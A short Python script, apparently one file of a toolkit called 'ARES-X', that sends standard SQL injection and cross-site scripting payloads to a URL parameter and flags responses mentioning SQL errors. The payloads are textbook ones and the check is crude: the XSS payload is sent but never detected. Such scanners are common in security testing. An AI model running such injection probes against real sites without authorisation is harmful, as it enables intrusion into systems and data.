# ARES-X File 17: SQL/XSS Automated Payloads
import requests

def test_injection(url, parameter):
    """Tests a URL parameter for common injection vulnerabilities."""
    # These payloads would eventually be pulled from your 4GB data/ folder
    payloads = ["' OR '1'='1", "<script>alert(1)</script>", "admin'--"]
    vulnerable = []
    
    for p in payloads:
        target_url = f"{url}?{parameter}={p}"
        response = requests.get(target_url)
        if "sql" in response.text.lower() or "mysql" in response.text.lower():
            vulnerable.append(f"Potential SQLi with: {p}")
            
    return vulnerable
